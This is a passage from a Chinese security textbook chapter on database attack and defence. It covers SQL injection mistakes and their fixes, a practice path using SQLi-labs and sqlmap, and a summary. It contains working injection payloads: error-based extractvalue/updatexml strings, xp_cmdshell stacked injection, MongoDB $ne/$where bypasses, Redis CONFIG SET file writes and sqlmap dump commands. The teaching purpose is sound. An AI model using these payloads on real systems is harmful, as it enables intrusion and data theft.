# Step 4: 使用新密码登录admin账户
# admin / hacked_password → 登录成功！
```

### 修复方案

```python
def change_password(self, username, new_password):
    """安全的修改密码"""
    cursor = self.conn.cursor()
    # 使用参数化查询
    query = "UPDATE users SET password = %s WHERE username = %s"
    cursor.execute(query, (hashlib.md5(new_password.encode()).hexdigest(), username))
    self.conn.commit()
```

***
## 案例总结

| 案例 | 漏洞类型 | 难度 | 关键技术 |
|------|---------|------|---------|
| 联合查询注入 | SQL注入 | ★★ | UNION SELECT |
| 时间盲注 | SQL注入 | ★★★ | SLEEP() + 脚本 |
| MongoDB注入 | NoSQL注入 | ★★★ | $ne/$gt操作符 |
| Redis未授权 | 配置漏洞 | ★★ | CONFIG SET + 写文件 |
| 二次注入 | SQL注入 | ★★★★ | 存储后触发 |

**练习建议：**
1. 在SQLi-labs靶场练习各种注入技术
2. 使用sqlmap自动化练习，理解其工作原理
3. 搭建MongoDB和Redis环境，复现NoSQL注入
4. 编写自动化注入脚本，提高效率

***

***
# 第11章 常见误区——数据库安全的陷阱

## 误区一：认为存储过程能完全防止SQL注入

### 错误认知
认为使用存储过程就绝对安全，不会被SQL注入。

### 正确做法
```sql
-- ❌ 错误：存储过程中使用动态SQL
CREATE PROCEDURE GetUser @username NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(200)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)  -- 仍然存在注入！
END

-- ✅ 正确：存储过程中使用参数化
CREATE PROCEDURE GetUser @username NVARCHAR(50)
AS
BEGIN
    SELECT * FROM users WHERE username = @username
END

-- ✅ 正确：动态SQL使用参数化
CREATE PROCEDURE SearchUsers @column NVARCHAR(50), @value NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(200)
    SET @sql = 'SELECT * FROM users WHERE ' + QUOTENAME(@column) + ' = @val'
    EXEC sp_executesql @sql, N'@val NVARCHAR(50)', @val = @value
END
```

***
## 误区二：只防御SELECT查询的注入

### 错误认知
只关注数据查询的注入，忽略INSERT、UPDATE、DELETE的注入。

### 正确做法
```python
# ❌ 错误：只对SELECT做了防护
def get_user(username):
    # 使用了参数化查询
    cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

def update_user(username, email):
    # 但这里忘了参数化！
    query = f"UPDATE users SET email = '{email}' WHERE username = '{username}'"
    cursor.execute(query)

# ✅ 正确：所有SQL操作都使用参数化查询
def get_user(username):
    cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

def update_user(username, email):
    cursor.execute("UPDATE users SET email = %s WHERE username = %s", (email, username))

def delete_user(username):
    cursor.execute("DELETE FROM users WHERE username = %s", (username,))
```

***
## 误区三：依赖黑名单过滤

### 错误认知
使用黑名单过滤危险字符就能防止SQL注入。

### 正确做法
```python
# ❌ 错误：黑名单过滤
def sanitize(input):
    blacklist = ["'", '"', "--", ";", "/*", "*/", "UNION", "SELECT"]
    for char in blacklist:
        input = input.replace(char, "")
    return input

# 绕过方法：
# 1. 大小写变形：UnIoN SeLeCt
# 2. 双写绕过：SELSELECTECT
# 3. 编码绕过：%27 (URL编码的单引号)
# 4. 注释绕过：UN/**/ION SEL/**/ECT
# 5. 特殊字符：0x27 (十六进制单引号)

# ✅ 正确：使用参数化查询（白名单方法）
def safe_query(username):
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))

# ✅ 正确：输入验证作为额外防御
import re
def validate_username(username):
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username
```

***
## 误区四：错误的错误处理

### 错误认知
将数据库错误信息直接返回给用户。

### 正确做法
```python
# ❌ 错误：暴露数据库错误
@app.route('/api/user')
def get_user():
    try:
        username = request.args.get('username')
        cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
        return jsonify(cursor.fetchone())
    except Exception as e:
        # 暴露了数据库类型、表结构等敏感信息！
        return jsonify({"error": str(e)}), 500

# ✅ 正确：通用错误信息 + 详细日志
import logging

logger = logging.getLogger(__name__)

@app.route('/api/user')
def get_user():
    try:
        username = request.args.get('username')
        cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
        return jsonify(cursor.fetchone())
    except Exception as e:
        # 只返回通用错误信息
        logger.error(f"Database error: {e}", exc_info=True)
        return jsonify({"error": "An error occurred"}), 500
```

***
## 误区五：MongoDB不需要安全配置

### 错误认知
认为NoSQL数据库默认就是安全的。

### 正确做法
```javascript
// ❌ 错误：MongoDB使用默认配置
// 默认无认证，绑定所有IP

// ✅ 正确：MongoDB安全配置

// 1. 启用认证
// mongod --auth

// 2. 创建管理员
db.createUser({
    user: "admin",
    pwd: "strong_password",
    roles: [{ role: "userAdminAnyDatabase", db: "admin" }]
});

// 3. 创建应用专用用户
use myapp
db.createUser({
    user: "app",
    pwd: "app_password",
    roles: [{ role: "readWrite", db: "myapp" }]
});

// 4. 绑定特定IP
// mongod --bind_ip 127.0.0.1,192.168.1.100

// 5. 启用TLS
// mongod --tlsMode requireTLS --tlsCertificateKeyFile /path/to/cert.pem

// 6. 启用审计日志
// mongod --auditDestination file --auditFormat JSON --auditPath /var/log/mongodb/audit.json
```

***
## 误区六：Redis暴露在公网上

### 错误认知
Redis是内存数据库，不需要安全配置。

### 正确做法
```bash
# ❌ 错误：Redis暴露在公网且无密码
# redis.conf
bind 0.0.0.0
# requirepass 未设置

# ✅ 正确：Redis安全配置

# 1. 绑定内网IP
bind 127.0.0.1 192.168.1.100

# 2. 设置强密码
requirepass YourStrongPassword123!

# 3. 禁用危险命令
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command CONFIG "CONFIG_b92a9e7c"
rename-command DEBUG ""
rename-command SHUTDOWN ""
rename-command SLAVEOF ""

# 4. 使用ACL（Redis 6.0+）
ACL SETUSER app on >password ~* +get +set

# 5. 启用TLS
tls-port 6380
tls-cert-file /path/to/cert.pem
tls-key-file /path/to/key.pem
tls-auth-clients yes

# 6. 使用非root用户运行
# useradd -r -s /bin/false redis
# chown -R redis:redis /var/lib/redis
```

***
## 误区七：忽略数据库备份安全

### 错误认知
数据库备份文件不需要保护。

### 正确做法
```bash
# ❌ 错误：备份文件存储在Web目录下
mysqldump -u root mydb > /var/www/html/backup.sql
# 任何人都可以下载！

# ❌ 错误：备份文件权限过宽
chmod 644 /backups/db_backup.sql

# ✅ 正确：安全的备份策略

# 1. 存储在安全位置
mysqldump -u root mydb > /backups/db_backup_$(date +%Y%m%d).sql

# 2. 设置正确权限
chmod 600 /backups/db_backup_*.sql
chown root:root /backups/db_backup_*.sql

# 3. 加密备份
mysqldump -u root mydb | gzip | openssl enc -aes-256-cbc -salt -out /backups/db_backup.sql.gz.enc

# 4. 异地备份
rsync -avz /backups/ backup-server:/secure-backups/

# 5. 定期清理
find /backups/ -name "*.sql.gz.enc" -mtime +30 -delete
```

***
## 误区八：使用弱密码或默认密码

### 错误认知
数据库只在内网，不需要强密码。

### 正确做法
```sql
-- ❌ 错误：使用弱密码
CREATE USER 'app'@'localhost' IDENTIFIED BY '123456';
CREATE USER 'admin'@'localhost' IDENTIFIED BY 'admin';

-- ❌ 错误：使用默认密码
-- MySQL root: 空密码
-- PostgreSQL postgres: postgres
-- MongoDB: 无密码

-- ✅ 正确：使用强密码
-- 生成强密码
-- openssl rand -base64 32

CREATE USER 'app'@'localhost' IDENTIFIED BY 'Kj#9xM!p2$vL@nQ5wR8tY^uI&oP';
ALTER USER 'root'@'localhost' IDENTIFIED BY 'Super$ecureR00t!Pass#2024';

-- ✅ 正确：限制密码失败次数
-- MySQL 8.0+
ALTER USER 'app'@'localhost' FAILED_LOGIN_ATTEMPTS 5 PASSWORD_LOCK_TIME 1;

-- ✅ 正确：定期更换密码
ALTER USER 'app'@'localhost' IDENTIFIED BY 'NewStr0ng!Pass#2024';
```

***
## 误区九：不监控数据库活动

### 错误认知
部署后不需要监控数据库活动。

### 正确做法
```sql
-- ✅ 正确：启用审计日志

-- MySQL审计插件
INSTALL PLUGIN audit_log SONAME 'audit_log.so';
SET GLOBAL audit_log_policy = 'ALL';

-- PostgreSQL日志配置
-- postgresql.conf:
-- log_statement = 'all'
-- log_connections = on
-- log_disconnections = on
-- log_duration = on

-- ✅ 正确：监控可疑活动
-- 检测暴力破解
SELECT user, host, COUNT(*) as attempts
FROM mysql.general_log
WHERE command = 'Connect' AND event_time > NOW() - INTERVAL 1 HOUR
GROUP BY user, host
HAVING attempts > 10;

-- 检测异常查询
SELECT * FROM mysql.general_log
WHERE argument LIKE '%UNION%'
   OR argument LIKE '%information_schema%'
   OR argument LIKE '%LOAD_FILE%';
```

***
## 误区十：不更新数据库软件

### 错误认知
数据库运行稳定，不需要更新。

### 正确做法
```text
数据库安全管理：

1. 定期更新
   - 订阅数据库安全公告
   - 及时应用安全补丁
   - 测试更新后部署到生产环境

2. 版本管理
   - 记录当前数据库版本
   - 了解已知漏洞
   - 制定更新计划

3. 漏洞扫描
   - 使用漏洞扫描工具定期检查
   - 关注CVE数据库
   - 参与安全社区

4. 最小权限原则
   - 应用使用专用低权限账户
   - 禁用不需要的功能
   - 定期审计权限
```

***
## 总结

| 误区 | 核心教训 |
|------|---------|
| 存储过程绝对安全 | 动态SQL仍需参数化 |
| 只防SELECT注入 | 所有SQL操作都需要防护 |
| 依赖黑名单 | 使用参数化查询（白名单） |
| 暴露错误信息 | 通用错误 + 详细日志 |
| MongoDB不需要安全 | 启用认证和TLS |
| Redis暴露公网 | 绑定IP + 设密码 + 禁命令 |
| 备份不安全 | 加密 + 权限控制 + 异地 |
| 使用弱密码 | 强密码 + 定期更换 |
| 不监控活动 | 启用审计日志 |
| 不更新软件 | 及时应用安全补丁 |

***

***
# 第11章 练习方法——数据库安全学习路径

## 第一阶段：SQL基础与数据库操作（1-2周）

### 目标
熟练掌握SQL语言，理解关系型数据库的基本操作。

### 练习任务

**1. SQL基础练习**
```sql
-- 练习1：创建数据库和表
CREATE DATABASE practice;
USE practice;

CREATE TABLE products (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(100),
    category VARCHAR(50),
    price DECIMAL(10,2),
    stock INT
);

-- 练习2：基本CRUD操作
INSERT INTO products (name, category, price, stock) VALUES ('iPhone', 'Electronics', 999.99, 100);
SELECT * FROM products WHERE price > 500;
UPDATE products SET stock = stock - 1 WHERE id = 1;
DELETE FROM products WHERE stock = 0;

-- 练习3：复杂查询
-- 多表连接
-- 子查询
-- 聚合函数
-- GROUP BY 和 HAVING
```

**2. 数据库管理练习**
```bash
# 安装MySQL
sudo apt install mysql-server

# 安全初始化
sudo mysql_secure_installation

# 创建用户和授权
mysql -u root -p
CREATE USER 'practice'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON practice.* TO 'practice'@'localhost';
FLUSH PRIVILEGES;
```

### 推荐资源
- **SQLZoo**（在线SQL练习）
- **HackerRank SQL**（SQL挑战）
- **LeetCode Database**（数据库题目）
- **《SQL必知必会》**

***
## 第二阶段：SQL注入基础（2-3周）

### 目标
理解SQL注入原理，掌握基本的手动注入技术。

### 练习任务

**1. 搭建练习环境**
```bash
# 安装SQLi-labs
git clone https://github.com/Audi-1/sqli-labs.git /var/www/html/sqli-labs

# 或使用Docker
docker pull acgpiano/sqli-labs
docker run -dt --name sqli-labs -p 8080:80 acgpiano/sqli-labs

# 访问 http://localhost:8080 初始化数据库
```

**2. 手动注入练习**
```text
SQLi-labs练习顺序：
1. Less-1：GET型字符型注入
2. Less-2：GET型数字型注入
3. Less-3：GET型字符型注入（变形）
4. Less-4：GET型字符型注入（双引号）
5. Less-5：GET型布尔盲注
6. Less-6：GET型布尔盲注（双引号）
7. Less-7：GET型文件读写注入
8. Less-8：GET型布尔盲注
9. Less-9：GET型时间盲注
10. Less-10：GET型时间盲注（双引号）
```

**3. sqlmap练习**
```bash
# 基本使用
sqlmap -u "http://localhost:8080/Less-1/?id=1" --batch

# 练习各种参数
sqlmap -u "http://localhost:8080/Less-1/?id=1" --dbs
sqlmap -u "http://localhost:8080/Less-1/?id=1" -D security --tables
sqlmap -u "http://localhost:8080/Less-1/?id=1" -D security -T users --dump

# 练习绕过WAF
sqlmap -u "http://localhost:8080/Less-1/?id=1" --tamper=space2comment
```

***
## 第三阶段：高级注入技术（2-3周）

### 目标
掌握报错注入、盲注、堆叠注入、二次注入等高级技术。

### 练习任务

**1. 报错注入练习**
```sql
-- 在SQLi-labs中练习
-- Less-1 开始，尝试报错注入

-- extractvalue
?id=-1' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+

-- updatexml
?id=-1' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+

-- floor
?id=-1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+
```

**2. 盲注脚本编写**
```python
# 练习编写自动化盲注脚本
# 1. 布尔盲注脚本
# 2. 时间盲注脚本
# 3. 二分法优化脚本

# 示例：二分法布尔盲注
def binary_blind_inject(url):
    result = ""
    for i in range(1, 100):
        low, high = 32, 127
        while low < high:
            mid = (low + high) // 2
            payload = f"-1' OR ASCII(SUBSTR(database(),{i},1))>{mid}--"
            # ... 发送请求判断 ...
        result += chr(low)
    return result
```

**3. 堆叠注入练习**
```sql
-- MSSQL堆叠注入练习
-- 使用Docker搭建MSSQL环境

-- 练习执行系统命令
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'dir C:\'--
```

***
## 第四阶段：NoSQL注入（1-2周）

### 目标
掌握MongoDB和Redis的攻击方法。

### 练习任务

**1. MongoDB注入练习**
```javascript
// 搭建Node.js + MongoDB练习环境

// 练习认证绕过
// { "username": "admin", "password": { "$ne": "" } }

// 练习操作符注入
// { "username": { "$gt": "" } }
// { "username": { "$regex": ".*" } }

// 练习$where注入
// { "$where": "1==1" }
```

**2. Redis未授权访问练习**
```bash
# 使用Docker搭建Redis
docker run -d --name redis-test -p 6379:6379 redis

# 练习未授权访问
redis-cli -h 127.0.0.1
> INFO
> CONFIG GET *

# 练习写入文件
> CONFIG SET dir /tmp/
> CONFIG SET dbfilename test.txt
> SET x "hello"
> SAVE
```

***
## 第五阶段：数据库安全加固（1-2周）

### 目标
掌握数据库安全配置和最佳实践。

### 练习任务

**1. MySQL安全加固**
```sql
-- 练习：按照安全基线配置MySQL
-- 1. 删除匿名用户
-- 2. 禁止远程root
-- 3. 删除测试数据库
-- 4. 设置密码策略
-- 5. 启用审计日志
```

**2. MongoDB安全加固**
```javascript
// 练习：按照安全基线配置MongoDB
// 1. 启用认证
// 2. 创建管理员和应用用户
// 3. 绑定IP
// 4. 启用TLS
```

**3. 编写安全审计脚本**
```python
# 练习：编写数据库安全审计脚本
# 检查项目：
# - 密码强度
# - 权限配置
# - 网络暴露
# - 日志配置
# - 软件版本
```

***
## 推荐练习平台

| 平台 | 特点 | 推荐度 |
|------|------|-------|
| SQLi-labs | SQL注入专项练习 | ★★★★★ |
| DVWA | 综合Web安全练习 | ★★★★ |
| PortSwigger | Web安全权威 | ★★★★★ |
| HackTheBox | 综合渗透测试 | ★★★★ |
| TryHackMe | 入门友好 | ★★★★ |
| SQLZoo | SQL基础练习 | ★★★★ |

***
## 每日练习建议

| 时间段 | 内容 | 时长 |
|-------|------|------|
| 上午 | 理论学习（SQL注入原理） | 1小时 |
| 下午 | 手动注入练习 | 2小时 |
| 晚上 | 自动化脚本编写 | 1.5小时 |
| 睡前 | 总结笔记 | 30分钟 |

**关键原则：**
- 每天至少完成5道SQL注入题目
- 每周编写一个自动化注入工具
- 每月参加一次CTF比赛
- 建立自己的Payload字典

***

***
# 第11章 本章小结

## 核心知识点回顾

本章系统讲解了数据库安全攻防和数据结构在安全中的应用，从SQL注入到NoSQL攻击，从理论基础到实战技巧。

### 1. 数据库在安全中的地位

数据库是Web应用的核心组件：
- **存储所有业务数据**：用户信息、交易记录、配置数据
- **SQL注入是最常见的Web漏洞之一**：OWASP Top 10持续上榜
- **数据库提权是渗透测试的关键步骤**：从Web权限到系统权限
- **NoSQL数据库同样存在安全风险**：MongoDB注入、Redis未授权

### 2. 理论基础要点

**关系型数据库**：
- SQL语言分为DDL、DML、DCL
- MySQL/PostgreSQL的安全模型和权限体系
- 参数化查询是防御SQL注入的根本方法

**NoSQL数据库**：
- MongoDB文档模型和操作符
- Redis键值模型和数据类型
- NoSQL注入的原理和方法

**数据结构**：
- 哈希表在会话管理和速率限制中的应用
- 树结构在恶意域名检测中的应用
- 图结构在攻击路径分析中的应用

### 3. 核心技巧总结

| 技术 | 原理 | 应用 |
|------|------|------|
| 联合查询注入 | UNION SELECT获取数据 | 直接回显注入 |
| 报错注入 | 通过错误信息获取数据 | 无回显但报错 |
| 布尔盲注 | 通过页面差异判断 | 无回显无报错 |
| 时间盲注 | 通过响应时间判断 | 完全无回显 |
| 堆叠注入 | 执行多条SQL语句 | 数据修改/系统命令 |
| 二次注入 | 存储后在其他查询中触发 | 绕过参数化 |
| NoSQL注入 | MongoDB操作符注入 | 认证绕过 |
| Redis利用 | 未授权访问写文件 | RCE |

### 4. 安全保护机制

| 防御方法 | 原理 | 效果 |
|---------|------|------|
| 参数化查询 | 数据和代码分离 | 根本防御 |
| 输入验证 | 白名单校验 | 额外防御 |
| WAF | 过滤恶意请求 | 辅助防御 |
| 最小权限 | 限制数据库账户权限 | 减小影响 |
| 审计日志 | 记录所有操作 | 事后追溯 |

### 5. 常见误区警示

- **存储过程绝对安全**：动态SQL仍需参数化
- **只防SELECT注入**：所有SQL操作都需要防护
- **依赖黑名单**：使用参数化查询
- **暴露错误信息**：通用错误 + 详细日志
- **MongoDB不需要安全**：启用认证和TLS
- **Redis暴露公网**：绑定IP + 设密码
- **使用弱密码**：强密码 + 定期更换

## 关键能力检查清单

学习完本章后，你应该能够：

- [ ] 理解SQL注入的原理和分类
- [ ] 手动进行联合查询注入
- [ ] 进行报错注入和盲注
- [ ] 使用sqlmap自动化注入
- [ ] 进行MongoDB注入攻击
- [ ] 利用Redis未授权访问
- [ ] 理解二次注入的原理
- [ ] 使用参数化查询防御注入
- [ ] 配置安全的数据库环境
- [ ] 编写自动化注入脚本

## 下一步学习方向

完成本章后，建议按以下顺序继续学习：

1. **第12章 云计算基础**：学习云环境下的数据库安全
2. **第14章 Web安全（OWASP Top 10）**：系统学习Web安全漏洞
3. **第15章 网络渗透测试**：学习完整的渗透测试流程
4. **第17章 逆向工程**：理解数据库客户端的逆向分析

## 推荐工具速查

| 工具 | 用途 | 安装 |
|------|------|------|
| sqlmap | SQL注入自动化 | `pip install sqlmap` |
| NoSQLMap | NoSQL注入工具 | `pip install nosqlmap` |
| Burp Suite | Web安全测试 | https://portswigger.net |
| SQLi-labs | SQL注入练习 | https://github.com/Audi-1/sqli-labs |
| DVWA | 综合Web安全练习 | https://github.com/digininja/DVWA |
| Hydra | 数据库暴力破解 | `apt install hydra` |

## 学习建议

> **"SQL注入虽然古老，但依然是最危险的Web漏洞之一。"**
>
> 很多人认为SQL注入已经过时了，但实际上它仍然频繁出现在CVE报告和实际攻击中。掌握SQL注入不仅是学习一个漏洞类型，更是理解"输入验证"和"数据与代码分离"这两个安全核心概念。
>
> **关键建议：**
> 1. **先理解原理，再学工具**：手动注入比sqlmap更重要
> 2. **多种数据库都要学**：MySQL、PostgreSQL、MSSQL、MongoDB、Redis
> 3. **攻防并重**：既要会攻击，也要会防御
> 4. **自动化思维**：把重复的注入过程脚本化
> 5. **持续更新**：关注新的注入技术和绕过方法

***